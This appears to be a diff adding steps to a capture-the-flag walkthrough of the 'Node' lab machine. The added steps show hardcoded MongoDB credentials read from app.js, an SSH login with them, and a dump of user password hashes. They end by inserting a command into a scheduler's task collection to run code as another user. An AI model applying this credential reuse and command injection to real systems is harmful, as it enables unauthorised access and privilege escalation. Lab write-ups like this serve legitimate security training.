@@ -173,3 +173,170 @@ bootstrap 3.3.7 has known vulnerabilities: severity: high; issue: 28236, summary
 /home/htb-jib1337/var/www/myplace/static/vendor/bootstrap/js/bootstrap.min.js
  ↳ bootstrap 3.3.7
 bootstrap 3.3.7 has known vulnerabilities: severity: high; issue: 28236, summary: XSS in data-template, data-content and data-title properties of tooltip/popover, CVE: CVE-2019-8331; https://github.com/twbs/bootstrap/issues/28236 severity: medium; issue: 20184, summary: XSS in data-target property of scrollspy, CVE: CVE-2018-14041; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in collapse data-parent attribute, CVE: CVE-2018-14040; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in data-container property of tooltip, CVE: CVE-2018-14042; https://github.com/twbs/bootstrap/issues/20184
+```
+None of these vulnerabilities are of interest.  
+Manually checking the source code reveals some credentials which have been hardcoded:
+```js
+─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-t9ycdo1if1]─[~/node/var/www/myplace]
+└──╼ [★]$ cat app.js | head -n 20
+
+const express     = require('express');
+const session     = require('express-session');
+const bodyParser  = require('body-parser');
+const crypto      = require('crypto');
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const path        = require("path");
+const spawn        = require('child_process').spawn;
+const app         = express();
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+```
+These credentials are `mark:5AYRft73VtFpc84k`.
+
+### 5. Get a shell on the machine
+These new creds can be used to access SSH.
+```bash
+─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-t9ycdo1if1]─[~/node/var/www/myplace]
+└──╼ [★]$ ssh mark@10.129.81.230
+The authenticity of host '10.129.81.230 (10.129.81.230)' can't be established.
+ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.81.230' (ECDSA) to the list of known hosts.
+mark@10.129.81.230's password: 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+
+              .-. 
+        .-'``(|||) 
+     ,`\ \    `-`.                 88                         88 
+    /   \ '``-.   `                88                         88 
+  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
+ (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
+  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
+    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
+     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
+        `-..-(   ) 
+              `-` 
+
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
+mark@node:~$ whoami
+mark
+```
+
+### 6. Enumeration
+- The user has no sudo perms  
+There are three users on the machine:
+```bash
+mark@node:/home$ ls
+frank  mark  tom
+```
+In the running processes, there is a mongo database running and two node applications.
+```bash
+mark@node:/home$ ps aux | grep mongo
+mongodb   1425  0.4 12.4 286080 94336 ?        Ssl  11:31   0:06 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
+mark      1804  0.0  0.1  14228   932 pts/0    S+   11:54   0:00 grep --color=auto mongo
+mark@node:/home$ ps aux | grep node
+tom       1426  0.0  6.7 1028148 51392 ?       Ssl  11:31   0:01 /usr/bin/node /var/www/myplace/app.js
+tom       1431  0.0  5.1 1008056 38992 ?       Ssl  11:31   0:00 /usr/bin/node /var/scheduler/app.js
+```
+Looking at the scheduler, it is a small application that executes commands from it's mongodb database.
+```bash
+mark@node:/var/scheduler$ cat app.js 
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+```
+It happens to be reusing the same credentials as the myplace database, so we should be able to access both of them and check them out.
+
+### 7. Look at the databases
+The first database, "myplace", just has the previously-discovered credentials and nothing else.
+```bash
+mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k myplace
+MongoDB shell version: 3.2.16
+connecting to: myplace
+> db
+myplace
+> db.collection.count()
+0
+> db.getCollectionNames()
+[ "users" ]
+> db.users.find( {} )
+{ "_id" : ObjectId("59a7365b98aa325cc03ee51c"), "username" : "myP14ceAdm1nAcc0uNT", "password" : "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af", "is_admin" : true }
+{ "_id" : ObjectId("59a7368398aa325cc03ee51d"), "username" : "tom", "password" : "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240", "is_admin" : false }
+{ "_id" : ObjectId("59a7368e98aa325cc03ee51e"), "username" : "mark", "password" : "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73", "is_admin" : false }
+{ "_id" : ObjectId("59aa9781cced6f1d1490fce9"), "username" : "rastating", "password" : "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0", "is_admin" : false }
+```
+The scheduler database has one collection called "tasks", which is empty.
+```bash
+mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
+MongoDB shell version: 3.2.16
+connecting to: scheduler
+> db
+scheduler
+> db.collection.count()
+0
+> db.getCollectionNames()
+[ "tasks" ]
+> db.tasks.find( {} )
+> 
+```
+I can attempt to add a command and see if it executes. First I try a bash reverse shell which fails, but I try something simpler - adding a file to /tmp which works.
+```bash
+> db.tasks.insert({"cmd":"echo test > /tmp/test.txt"})
+WriteResult({ "nInserted" : 1 })
+> db.tasks.find( {} )
+{ "_id" : ObjectId("5ffee4ea0cb0aeb47b0cbf59"), "cmd" : "echo test > /tmp/test.txt" }
+> exit
+bye
+mark@node:/var/scheduler$ ls /tmp/test.txt 
+/tmp/test.txt
+mark@node:/var/scheduler$ ls -l /tmp/test.txt 
+-rw-r--r-- 1 tom tom 5 Jan 13 12:17 /tmp/test.txt
+```
+This confirms I have some degree of command execution as the tom user, now to figure out how to use it.
+
+
